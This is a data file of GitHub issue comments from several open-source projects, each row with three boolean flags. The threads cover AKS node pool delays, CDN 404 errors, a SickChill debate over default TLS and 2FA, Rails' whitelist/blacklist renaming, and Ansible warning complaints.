AKS/Azure/287/445806268,Is there a criteria to close an issue @friend? Why it would be closed if the issue was not solved? ,False,True,False,AKS/Azure/287
AKS/Azure/287/446342057,"My apologies. I should have been clearer about the closure. Per the readme, we are trying to keep this repo focused on issues with the existing scope of the service, while directing feature requests to the Azure Feedback Forum, which allows us to easily see the priority of various requests based on the votes received. When items are tracked there, I am closing them here to avoid duplication and keep this repo focused on bugs. To answer the questions from @friend  No, you will not be able to have node pools in different regions attached to the same AKS cluster. Yes, it will possible to have different pool sizes.  ",False,True,False,AKS/Azure/287
AKS/Azure/287/453201101,@friend please reopen this ticket. It has not been resolved and is still in progress. ,False,True,False,AKS/Azure/287
AKS/Azure/287/455953278,"It is now 2019, any update of a deployment/rollout date for each region? ",False,True,False,AKS/Azure/287
AKS/Azure/287/463188699,"@friend, any update on this feature? Is it still predicted for this quarter? ",False,True,False,AKS/Azure/287
AKS/Azure/287/466063531,"Responding here per closed thread issue #132  and this thread. @friend apologies if the word 'insane' was not in line with the Code of conduct currently in effect. I do not doubt that the team is working hard, and have had positive experience with the Azure k8 team in the past. however, the current line of communication from the k8 team warrants raising some concern - generally  developers build/design systems based on two main assumptions (1) current capabilities of a provider, (2) reasonable timeline of improvement/change of provider's capabilities.   with (1) should be reasonably available from the current provider Docs for the latest stable version   yet for (2) we are reliant on the clear communication of the provider, and use a common sense prior on past confirmation of said communication.    When (2) is not aligned with the realized future too many times, developers have a fiduciary duty to their current employer/investors to strongly recommend to not use a certain provider's offered resources. Especially since designing said systems takes time, resources, and often locks the end-user in to a specific provider. In this specific case, with the provider being Microsoft Azure, and the product managed k8 clusters, the (2) communication falls short. When the official line of communication signals Q3 2018, then Q4 2018, and currently (at the end of Q1 2019) signals Q1 2019, there is a problem. To censor raising such a concern is concerning. ",False,True,False,AKS/Azure/287
AKS/Azure/287/480075240,Multiple node pool support is on track for 1H2019 delivery. Reopening to track this as a roadmap top-level item. Please remember this repository is operated under the Microsoft code of conduct ( and comments not adhering to it will be removed. ,False,True,False,AKS/Azure/287
AKS/Azure/287/491363342,Multiple node pools are now in public preview ,False,True,False,AKS/Azure/287
cdnjs/cdnjs/13175/394177591,According to the jQuery repository details on CDNJS the listed resources should be available  file now returns a 404 error. ,False,True,False,cdnjs/cdnjs/13175
cdnjs/cdnjs/13175/449974153, is also missing ,False,True,False,cdnjs/cdnjs/13175
cdnjs/cdnjs/13175/449974228,@friend should be the #13166 problem ,False,True,False,cdnjs/cdnjs/13175
cdnjs/cdnjs/13175/449974590, another 404 ,False,True,False,cdnjs/cdnjs/13175
cdnjs/cdnjs/13175/449976584,"@friend thanks for reporting, let's move to #13165 or #13166 ",False,True,False,cdnjs/cdnjs/13175
cdnjs/cdnjs/13175/449976585, of those are also 404 ,False,True,False,cdnjs/cdnjs/13175
cdnjs/cdnjs/13175/450017610,"@friend Yeah I can access these files so is #13166  Will close this to keep it all centralised. @friend If you get the 404 issues again on these files, please post the response headers and the URL requested to #13166 to help with us fixing this issue. ",False,True,False,cdnjs/cdnjs/13175
AKS/Azure/759/391296858,I am opening this issue as #287 was closed without any updates! Also tracked on ,False,True,False,AKS/Azure/759
AKS/Azure/759/447822985,It would be very helpful to have an update on this. We are currently considering move out of AKS to workaround this. As the alternative is to rebuild the whole cluster might as well move to a service that supports vertical scaling. We've seen the progress started since July Support multiple node pool ,False,True,False,AKS/Azure/759
AKS/Azure/759/449782842,"It's on it's way, more information at #287, specifically see ",False,True,False,AKS/Azure/759
AKS/Azure/759/479894815,"No answer at all in any channel. The feedback is in radio silence from the azure team, the issues in github keep been closed without any answer... Is there any new or previsions on this matter? The Q1 2019 is gone and this feature has been delayed now for 9 months. Children have been made and born in this time and AKS still has not acomplished to have multiple node pools. ",False,True,False,AKS/Azure/759
sass/sass/2447/288314351,The issue #2442 is relevant. Thx ,False,True,False,sass/sass/2447
sass/sass/2447/359089968,It's not appropriate to file a new issue demanding that an existing issue be re-opened. You're welcome to continue discussion in #2442. ,False,True,False,sass/sass/2447
SickChill/SickChill/5159/376710421,"Please thumbs this so I can gauge user interest! I am saving for a Yubikey 5 NFC, so that I can implement hardware authentication and 2FA (using your own server as the auth, not ours or a 3rd party). Automatically generate the self signed ssl cert and enable SSL if it is not enabled Add settings buttons to generate letsencrypt SSL certs when you have a domain Force login authentication Yubikey/Hardware Auth support, including FIDO2, U2F, OTAP, etc ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435304624,I have a solo and solo tap as pledge from kickstarter with FIDO2 support. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435306437,I'm trying to save any crypto I get until the markets spike at least. Saving via other means.  Solo looks cool though. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435308903,"I am definitely in favor of  forced SSL using letsencrypt, with fallback to self signed forced authentication when peer IP is public ip  To me MFA support is nice to have, but mostly fun to code stuck_out_tongue_winking_eye ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435310584,"I feel like hardware auth is going to be the common way of doing things soon, want to get on board early ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435321125,"I do not expect it to be 'the common way' for a while, since Microsoft (Windows) has a few steps to go. Granted with FIDO2/WebAuthN all big players and all big browsers are on board, but  There is no support for FIDO2 in Azure AD yet, for personal nor business accounts There is no support for FIDO2 in ADFS yet There is no proper solution for WebAuthN in LDAP environments yet  But I agree, it's a good thing to lead the way 8) ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435342379,Shouldn't be mandatory but it would be good to have these things turned on by default and providing the option to turn them off (if they aren't already). Just my opinion. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435371397,"Of course hardware multifactor wont be required, but SSL and authentication by at least having a username and password set will. This will stop from tons of users' installs popping up all over the internet with no password, opening them up to all sort of attacks. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435378254,"I'm in favor of TLS, 2FA auth, etc on the assumption that it can be disabled easily. As a lot of other users, I run SickChill behind a proxy that already handles all of this. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435383331,"Everything can easily be set to not force this stuff in the ini, but by default it's going to ask you to set a password. Too many people leave their site web facing without even a simple password. TLS won't break your proxy, it will just encrypt the traffic between your proxy and SC. Multifactor auth obviously isnt going to be forced, its a feature. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435449628,"As a relative Luddite using Sickchill, my only concern is from an end-user perspective? What will be required from and end-user? I host SickChilll on QNAP NAS and while I only access using local IP, what would I need to do? Would I need to purchase a SSL certificate? I have no idea how to install and configure this stuff. I'm not against the idea but I'd hate to lose access due to my limited technical abilities. I haven't voted as do not feel qualified one way or the other. As long as from an end-user perspective it is transparent or documentation provided to manage the change I'm all for being secure! ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435541441,"While we'd have to work out the details on this, my guess at this moment would be  if you use SC accessible from internet, default behavior would be to force ssl on, and to request a free certificate using letsencrypt if you use SC accessible from Lan only force SSL to be on, and generate a self signed certificate, the use will have to accept once in every browser he uses  And this off course configurable, so you can forcr SC to behave differently, possibly entering your purchased certificate, or other fancy options ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435571711,"And when accessible from the internet by default SC will require you to set a login, whether it is user/pass or hardware auth. You could manually disable this forced authentication by setting a config value. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435571791,"@friend Letsencrypt gives free SSL certs if you own a domain, you would only need to buy an SSL cert if you wanted to, and when using IP only you would be using a self signed cert generated by SC. Nothing would change for the user except increased privacy and security. All of these changes would be handled by code, not the user. AKA, SC would generate the SSL cert whether it as with letsencrypt of a self signed cert, and SC would pop up a form on local network forcing the user to set a password. A true idiot could follow the directions that SC prompted them with, The minor inconvenience this would cause would be a one time thing, and it would be as simple as typing a username and pass or clicking a button. But it would protect your from phishing and MITM attacks and snooping. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435594914,@friend Many thanks for the clarification. I'll make my vote shortly (very happy to keep things secure). And great work by the way... So glad to be back with you guys on this repo. I continue to be impressed with your application and development. 10/10! ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435687584,"Yubikey bought, thanks for donation!  ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435699073,"My thoughts would be to recommend the security approach during the setup of sickchill for new users based on how it will be accessed (ie, lan only, direct internet access, internet access via proxy). Forcing security could break a few existing setups if people are using reverse proxy's for example. Also, you would need to take into account, third party applications, it could take them many days/weeks(if ever) to work with secure connections to sickchill. My 2p ) ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435766373,"My personal feelings on this are that application servers should not be responsible for TLS concerns, unless the end user is authenticating via a TLS client certificate (and only then in unusual circumstances). For years I've been using nginx to terminate TLS in front of applications like this, and it works quite well. Now that Docker is the main way to run web applications, the process is even easier - a dozen lines in docker-compose.yaml and sickchill, sab, and any related services are all protected and the app servers themselves needn't be extra complicated. I'd rather see yubi support in an nginx or other reverse-proxy layer than native in an app server like sickchill. At the reverse proxy layer, such work is more easily reusable. Looks like someone may have done it already  is the first hit on Google for ""nginx yubikey github"". I'd be happy to share the setup using docker, nginx, and letsencrypt to help other users get the same benefits, without needing to modify app servers or spend developer effort on many applications, when the layers already exist ) ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/435784966,"Configuring 4 different layers vs adding 3-5 lines to SC? Most people dont use a reverse proxy, and most people have no clue about running a secure web facing server. For the advanced users, these changes will not affect them, but I cannot just sit and let hundreds of users sit unprotected without so much as a password on their SR and open to the internet just because they don't know what they are doing. Seriously, the amount of push back is strange on some features that if you don't want to use you just don't use them. self signed ssl cert can be used between nginx and SC without hurting anything. fido2/u2f are just an added way to authenticate Not allowing public access without protection is a good thing. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436012402,"No problem then - I didn't realize it was only a few lines of code. Perhaps I misunderstood the proposal, but the word ""mandatory"" sure made it sound like this would break my existing setup and not offer ""just don't use them"" capabilities. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436262250,"I have the Feitian Multipass (BLE, NFC, USB) and the Feitian Key (NFC, USB - similar to Yubikey NFC). These are the same two keys in Googles Titan Key pack. Feitian is the OEM who makes them. Anyway, I'd love to have this feature on my Sickrage install and am more than willing to help test, etc. Just let us know! ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436457644,"I don't understand why all of this has to be mandatory.   Couldn't it be implemented as ""on"" by default, but have a setting where users could disable it? I don't care too much about the SSL bit -- as I can just ignore that in the browser if necessary.  But, I dislike the idea of having to log in (authenticate) every time. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436530560,"So far the feedback has been twofold  LGTM or (and this is mostly from power users) why have this mandatory?  Great feedback, I think that if we change 'mandatory' to 'enabled by default in new installs' there is no objection left? ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436538630,"""Enabled by default"" sounds like a great path forward to me plus one ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436564488,"It is mostly ""enabed by default"" ^ @friend you realize it is stored in a cookie? Currently it stays logged in for 30 days, you just have to log in once every 30 days for each browser. We can extend that cookie out for as long as we want, but we can't just let novice users (Users are really playing the role of web administrator) make disastrous mistakes simply because they are not web admins. Hundreds of SR/SC installs have been found in the wild with no login which are directly web facing. If there are advanced administrators who really want to leave their web facing install unprotected then I am sure they can change a bool in their config.ini to disable it. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436581140,Quick question - I am looking for said bool to disable listening on the external interface and can't find anything. Can you just set web_host to 127.0.0.1? Also my config.ini manual changes never get saved after restarting my sysd service for SC. Anyway to change this? Sorry don't mean to hijack this thread / issue.. My 2 cents regarding enabled by default - good for SSL and PW Auth. 2FA enabled by default may be too much for the novice users your trying to help with this.. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/436582025,@friend You have to shut SC down completely before you edit config.ini - change web_host from 0.0.0.0 to 127.0.0.1 ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437342104,"@friend I don't have my sickrage open to the public, only inbound connections. So I also don't want this enabled by default. Will the update process enable it or is the config.ini not updated on an update ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437418126,"You don't want what enabled by default? Setting a password and it running over ssl will not adversely effect any install. It simply improves security and safety. 2FA is just an added feature, to SUPPORT 2FA. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437420522,"I think that if TLS and password auth can both be disabled via the config, that would be a reasonable compromise. Then it doesn't matter too much if it's enabled by default. For people who don't want/need TLS (e.g. internal hosts), self-signed certificates become a hassle UX wise. Similar reasoning for password auth. It's probably best to allow people to disable both these features. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437422830,"@friend exactly, however, even though SSL will be able to be disabled, it should still be left enabled even if you are running it on 127.0.0.1/localhost with an nginx or other server/proxy on top. They can redirect to an TLS server just as well as a non-TLS, even when it is self-signed. Contrary to common misconception, true end-to-end encryption is not merely machine-to-machine. An attacker with local access to the machine, even though that access is not privileged and the attacker does not have permission for the server's files on the file system, can snoop and manipulate unencrypted traffic on localhost. If it is running over a TLS connection (even in virtual interfaces) the security is greatly increased. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437423163,Honestly the only people who should be against any of these ideas are people who want to snoop on or exploit users who use bad practices.  Who here works for the government or a media company? lol. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437424029,"Let's be fair here if a bad actor has local access to your machine, its game over. Encrypting comms on the wire, won't make any difference, as you have much more things to worry about than someone getting your sick chill data. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437425814,"I understand your view, but am very much of the kiss principle. If uneducated(from a security perspective)/unaware users run sickchill open on the net, they are leaving themselves exposed and your approach is a perfect, but for people in the know, or who do not want to further complicate their configuration, should have the option to run in non tls/non secure mode. I suggest that during a fresh install, a wizard is launched asking for how sickchill, will be accessed remotely and based on the response, you set default security settings accordingly. For existing installs, advise people of the new options(be it in the config file itself, or in the gui). That will alleviate the issue. Also one other point to consider, it is not just a human who accesses sickchill, other open source apps may do so as well(ie sabnzbd, nzb get, nzbtosickrage etc etc). It may take these a while to update their configs, to support secure connections. my 2p ) ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437430447,"All of those 3rd party apps already support all of the features I am talking about because we have had password authentication for years ^. The only new thing being added is the option to use 2FA, TLS and password auth have always been there. I agree a wizard would be acceptable, but someone needs to code it =P Prompting the user to enable or ignore TLS and prompting the user to set a password or ignore are much easier ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437433474,"Yea, but we ain't talking about password support, but some sort of encryption, which they may not support at the moment. ) I appreciate the wizard comments ) but was thinking more of asking the question, if they will be accessing sickchill remotely over the internet and configure accordingly(if yes, enable TLS, if not, don't enable it). ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437538805,"I will never, ever say no to increased security.  I currently run a reverse proxy for my setup and already use Let's Encrypt for my main internet-based access portal, and use passwords for everything from accessing both my portal and SickChill.  Let's go! ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437541624,@friend if you think that SC and nzbtomedia and nzbget and sabnzbd do not support https you are mistaken. ALL of the apps including SC have had the support for password logins and SSL/TLS (This just means https instead of http) for YEARS. We simply want to make the settings use the more secure settings that ARE ALREADY THERE in ALL of these apps. Absolutely nothing will break. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437542109,"Those particular apps where just examples, I just wanted to make the point, that by implementing tls, you could break third-party apps/code/plugins (ie chrome). Don't get me wrong, I am all for security, but it has to be the (educated) end users choice, not forced upon them. my 2p ) ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437543422,"No, it absolutely should be forced.  If you don't want it, then you can turn it off.  But if it is up to end users, it will never get done.   They will always opt for the paper house vs the brick house. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437565341,"Imo if a user is smart enough to install addons on SC, they will probably also be smart enough to figure out why this isn't working properly once TLS/Auth is enabled. I say let's not wait for every possible 3rd party integration to support this, but leave a GitHub notify/issue for the big ones, give them a week to confirm compatibility while the feature is build in a branch, which then gets merged into dev and onto the release train. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437629006,3rd party already support these features. We have had these features for more than 5 years. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437649314,Just don't make any of this required. I run SC on local server at home. No outside access at all. TSL/web-auth/2fa all pointless and overkill for something on my own network. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437650557,"It isnt going to make any changes to local access, and 2FA is just an optional feature that I plan to add support for, not a requirement. Web auth from remote machines? Yes, I'm going to block those if there is no password set or at least a hidden setting set. The people who REALLY WANT to run an insecure server will be able to do it, but it will be easier to be safe than to be unsafe from now on. You guys should read the thread before posting lol, nobody has ever said 2FA was going to be required, and it's going to pop up warnings for http connections and no web auth when connecting remotely unless they are dismissed/explicitly disabled.  You guys really dont take your freedom seriously? ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437671225,After reading the comments I'm OK with it. Putting in safe defaults and allowing them to be disabled is a lot better than having no protection or forcing it on with no option to turn it off. I'd prefer TOTP 2FA personally. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/437713742,"@friend I plan to support several different types of 2FA. This is why I got the yubikey 5 NFC, so that I could implement one but then continue on to implement all of the ones it supports. It supports more than any other key afaik, and I can work on using it over NFC on mobile also. I understand that most people will not use 2FA, or have a yubikey or other hardware auth key (software 2FA authenticators will work), which is why all of the 2FA features will be optional and DISABLED by default. But I believe that NOT supporting 2FA in 2018/19 sort of means we are behind the times. In order to use hardware keys, we have to be using https. This will bring our security into the 21st century. Having an unprotected server in 2018 is the equivalent of russian roulette. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/441364887,"It's great having certs if exposed to the internet, though my server is internal only and I'm presently only using http. Will this be forced on to me? Self signed certs are annoying, so it would ultimately force me to setup domain name and potentially open it up to the internet (if only briefly to get the cert). Don't get me wrong, I love this idea and switch 2fa on for everything I can. Though I would like it to be optional. Thanks everyone who helping out with the code, I love this service ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/441415955,Please read the comments. ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/441441784,"@friend while I can appreciate your position, good security is end-to-end encryption, from the client through to the application server, whether or not is it behind an encrypting reverse proxy. Authentication should be performed by the application, especially 2FA, or else there is a risk of MITM attacks and authentication replay attacks. These are good goals, however, 99+% of users will never implement a proxy, let alone add single or multi-factor authentication at that layer, and would instead use the application directly and accept the risk. Please do — this will greatly assist those who want to add additional security in this manner. IMHO, if you ""protect"" an application server behind an encrypting, authentication reverse proxy, there must be an encrypted connection between the proxy and application server and some form of client authentication by the proxy to the application server (e.g. mutual  SSL authentication), and any 2FA designed to mitigate replay attacks should be implemented and validated at the application server, even if the principle (credential) is validated by the proxy. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/441442375,"@friend I would first implement RFC 6238 (TOTP) and add hardware 2FA as a second stage.  Everyone can use TOTP today, while hardware solutions require people to first procure a device and get it working with their various choices of client. Agree, but begin by implementing software 2FA first, and add hardware 2FA later.  More people benefit from the significant increase in security, and the minor increase between software and hardware tokens is minimal for most situations. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/441444173,"@friend ABSOLUTELY AGREE — I wrote my comments above before seeing your response here! As I have added, the 2FA really must be in the application by default, unless a sophisticated user decides to fully delegate this to a proxy.  Even then, there should be some mechanism for the application server to validate and log the true client. In an ideal world, the authentication process should be fully secured from the client (web browser) through to the authentication provider (application server) in a manner that precludes inspection and manipulation by any intervening proxy servers — this can be achieved today using the W3C Web Cryptography API — though, as I said before, I'd start with software 2FA first. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/442053904,I use an nginx server to proxy to my sickchill server. Will i still be able to do this?  nginx handles ssl and passes to the sickchill server over http. this usecase should be considered ,False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/442186868,"It won't be passed to http, you add 2 lines to your proxy_pass and it will be ssl all the way from the client to the application. ",False,True,False,SickChill/SickChill/5159
SickChill/SickChill/5159/442521190,"Like ITJamie, i use nginx to proxy to sickchill. So  ""Automatically generate the self signed ssl cert and enable SSL if it is not enabled Add settings buttons to generate letsencrypt SSL certs when you have a domain Force login authentication"" is ok for me, since it's optionnal. I don't like to be forced to do something ;) ",False,True,False,SickChill/SickChill/5159
rails/rails/33677/352750519,"Per  I'd like for Rails to set a good example and tone by using better terminology when we can. An easy fix would be to replace our use of whitelist with allowlist and blacklist with denylist. We can even just use them as verbs directly, as we do with the former terms. So something is allowlisted or denylisted. I took a quick look and it seems like this change is mostly about docs. We only have one piece of the code that I could find on a search that uses the term whitelist with . Need to consider whether we need an alias and a deprecation for that. ",False,True,False,rails/rails/33677
rails/rails/33677/414870475,"Good intentions, but I doubt there's any relation of the origin of the terms blacklist/whitelist to race. There are many idioms and phrases in the English language that make use of colours without any racial backstories. I haven't met any black person (myself included) who was ever offended by the use of ""blacklist"". Frankly, a good number find it patronising to make this kind of change. ",False,True,False,rails/rails/33677
rails/rails/33677/414873068,At least one source from a search suggests the word had its origins around union members. ,False,True,False,rails/rails/33677
rails/rails/33677/414873738,"Regardless of origin, allow/deny are simply clearer terms that does not require tracing the history of black/white as representations of that meaning. We can simply use the meaning directly. ",False,True,False,rails/rails/33677
rails/rails/33677/414875618," etymology is quite important. in the end, we might consider plain words „black“ and „white“ racist and enter the realms of newspeak which i figure you especially, @friend, are familiar with.  “allow/deny are simply clearer terms” — now that’s an actual, technically useful argument.  can we please stop jumping onto political bandwagons? i am here for the sanity.   ",False,True,False,rails/rails/33677
rails/rails/33677/414877006,The terms Blocklist and Clearlist are sometimes used in place of Blacklist and Whitelist. ,False,True,False,rails/rails/33677
rails/rails/33677/414886139,I'm gonna go ahead and get started on this... 😄 ,False,True,False,rails/rails/33677
rails/rails/33677/414893315,"One could also argue that in color theory, black is the absence of color (photons which make up the spectrum) and white is the accumulation of all colors. Thus a blacklist is a list which contains elements that are to be absent and a whitelist to be allowed... ",False,True,False,rails/rails/33677
rails/rails/33677/414893935,"I think this is a great idea, I have proposed internally at multiple companies I've worked at changing master/slave and blacklist/whitelist to leader/replica and allowlist/denylist, if only because in an industry with poor representation it feels incredibly overt to be standing in a room full of mostly white people using these terms outloud. It doesn't matter what the origin or intent of this was, or whether people can find a narrow lens through which to see it as not a problem.  Consider using these terms in a coding or systems interview with someone you have just met. I understand that some black people may not consider these terms offensive, but I would rather someone not want to work with me because they think I am too politically correct than because they think I am too insensitive and blind. @friend thanks for beating me to the first PR on this. ) 💯 ",False,True,False,rails/rails/33677
rails/rails/33677/415013013,"@friend I respectfully disagree with your opinion that your (or my) future colleagues would impose that kind of cultural bias on words that exist in the English language as well as are well-defined on Wikipedia), of which  has far more far reaching disciplines than just comp-sci. That said and since I think this issue will garner overwhelming support in this community, I do support a compromise suggested by @friend's review to replace the actual words with their definition or some other phrase that is more fluid than a single term. ",False,True,False,rails/rails/33677
rails/rails/33677/415040253,"I think the question here should be is replacing  and  with  and  a better option? If presented with the word  and , which is most likely self-explanatory as to the action to be performed? ",False,True,False,rails/rails/33677
rails/rails/33677/415077239,"They should stop selling black or white cars. We weren't serious, right? ",False,True,False,rails/rails/33677
rails/rails/33677/415084810,"40% of the world's rubies are known to be blood rubies. Therefore, I propose renaming Ruby to something else, because the word Ruby is offensive to me. ",False,True,False,rails/rails/33677
rails/rails/33677/482582749,A quick search and replace in the codebase shows that all entries for those words were already changed. I'll close this issue. ,False,True,False,rails/rails/33677
coc.nvim/neoclide/305/394764130,"Result from CocInfo Run  command and paste the content below. Describe the bug A clear and concise description of what the bug is. Just as the title says. I think this is a regression and has been discussed and fixed before to a certain extent, but I don't remember where anymore. To Reproduce Steps to reproduce the behavior  Follow example from gif with clangd or ccls.  Screenshots  ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450468273,"You have to increase your  to get all signatures, it's limitation of vim. The server can't know which one you're completing with just ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450468338,@friend did you try fix it previously? I have the impression this used to work.... ,False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450468405,"Possibly I was using echodoc at the time, though I thought there was some attempt at fixing it on coc's side. ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450468763,"I suppose it could be figured out from contents of selection, even more if it contains complete-item  with some form of id. ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450469131,Not a realistic solution for C++ (or most languages supporting overloads). ,False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450469582,"That would require server to remember last resolved complete item, I think most server not. Because we don't have floating window yet. ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450469923,"Even with floating windows, it won't make sense to show all the overloads after one was chosen from the overload list in the popup. Unless you plan to provide an option for desabling the overloads from popup, they and their selection would be of no use. ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450471379,"Hmm, I think current signature display can only work nice on overload selection happening at opening parentheses, not before like now, when signatureHelp with current option didn't even start. ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450472319,Which is precisely what this does  ,False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450509473,"The other approach is to maintain how things work now, I think it doesn't require server to remember last resolved complete item. coc.nvim alone will have that responsibility, not the server. coc.nvim shaw store information upon item selection and when it asks for the signatureHelp overloads, it should bump the signatureHelp overload that best matches the one that was previously selected. ",False,True,False,coc.nvim/neoclide/305
coc.nvim/neoclide/305/450519037,"I will not implement this, since there's no spec of how signature should stored in complete item, and I don't like guess like what echodoc does. When you select a complete item, you can type more character or remove character to make it a different function call, it call be solved, but I don't think necessary. ",False,True,False,coc.nvim/neoclide/305
flutter_webview_plugin/fluttercommunity/60/312526026,"Hi, how can I open a file that is locally stored on the device? For example, if the file index.html is located inside my project's assets folder? ",False,True,False,flutter_webview_plugin/fluttercommunity/60
ansible/ansible/14050/127943230,Ansible version 2.0.0.2 running on OSX. When using a task like this one Then I get the warning Although the  module does not support the  functionality.  Note I only know the  module. AFAIK there is no  module as suggested in the warning. ,False,True,False,ansible/ansible/14050
ansible/ansible/14050/173683788,"This is really just a suggestion, as it's detected a module (in this case the apt module) overlaps with the command you're running. It can be ignored. Thanks! ",False,True,False,ansible/ansible/14050
ansible/ansible/14050/188257628,"Warnigns were not invented to be ignored. The fact that ansible  team you decided to ""deprecate"" apt usage without properly implementing our apt module does not mean that user have to ""ignore"" this unneeded spam. It seems to be like a bug while implementing the deprecation feature. At least we need a way to disable warnings for specific tasks. I tried to use command_warnings no at the task level but it seems that they are not supported, and disabling them globally does not make more sense either. ",False,True,False,ansible/ansible/14050
ansible/ansible/14050/189949333,this work's for me  ,False,True,False,ansible/ansible/14050
ansible/ansible/14050/238193663,"ssbarnea is correct. WARNINGS WERE NOT MEANT TO BE IGNORED. ... UNLESS I SPECIFICALLY DECIDE TO IGNORE THEM. But the useless fools who develop ansible seem to believe they can spew a billion useless warnings AND THEN NOT EVEN ALLOW ME TO HIDE THE WARNINGS I HAVE CAREFULLY CONSIDERED AND DECIDED TO IGNORE. How is anyone supposed to notice REAL warnings they might actually be interested in, when they cannot disable the millions of spurious warnings that they know they're not interested in. When users see a task generating a spurious, infuriating, and inappropriate warning, we MUST be able to silence it, SO WE CAN ACTUALLY NOTICE WHEN/IF A REAL WARNING IS GENERATED ELSEWHERE. Preventing users from silencing these warnings only buries real warnings in spurious garbage, and leads ot users just ignoring every warning they see. A METHOD MUST BE PROVIDED TO DISABLE THESE USELESS AND INCORRECT WARNINGS. ",False,True,False,ansible/ansible/14050
ansible/ansible/14050/238216536,"@friend I hope people will not take you comments personal and instead will what it really matters. I do sustain your points, less the way of putting it ;) ",False,True,False,ansible/ansible/14050
ansible/ansible/14050/238227079,"@friend  soo, you basically want  ? the command module already has this. ",False,True,False,ansible/ansible/14050
ansible/ansible/14050/238425048,"Ah. Ok, i stand corrected. Thanks for the tip. Apologies for my attitude. Christ on a bike, Ansible is a frustrating and annoying thing at times. It does wind me up. ",False,True,False,ansible/ansible/14050
ansible/ansible/14050/457615357,Disabling warnings ,False,True,False,ansible/ansible/14050
angular.js/angular/14436/148403731,"Note for support questions, please use one of these channels  This repository's issues are reserved for feature requests and bug reports. Do you want to request a feature or report a bug? BUG What is the current behavior?   eventHandlers{""progress""function (e) {                     console.log(e);                 }},   uploadEventHandlers {""progress"" function (e) {                     console.log(e);                 }} console.log responds with $rootScope If the current behavior is a bug, please provide the steps to reproduce and if possible a minimal demo of the problem via  or similar (template  event handlers for progress to $http post call that uploads a file to the server  upload the file and try to listen for progress info none of the progress information is being passed. What is the expected behavior? console.log would return the actual xhr event not $rootScope What is the motivation / use case for changing the behavior? I have been waiting 2 years for Angular to track the ""progress"" event and it still cant get it right?!?! Which versions of Angular, and which browser / OS are affected by this issue? Did this work in previous versions of Angular? Please also test with the latest stable and snapshot ( versions. 1.5.4 all major browsers Mac and PC Other information (e.g. stacktraces, related issues, suggestions how to fix) ",False,True,False,angular.js/angular/14436
angular.js/angular/14436/210012058,"What kind of attitude is that? See it like this, you had 2 years to provide a PR. ",False,True,False,angular.js/angular/14436
angular.js/angular/14436/210032472,"True, totally agree I didn't provide a PR that doesn't change the fact the bug exist where it shouldn't as this issue was in development for a long time. ",False,True,False,angular.js/angular/14436
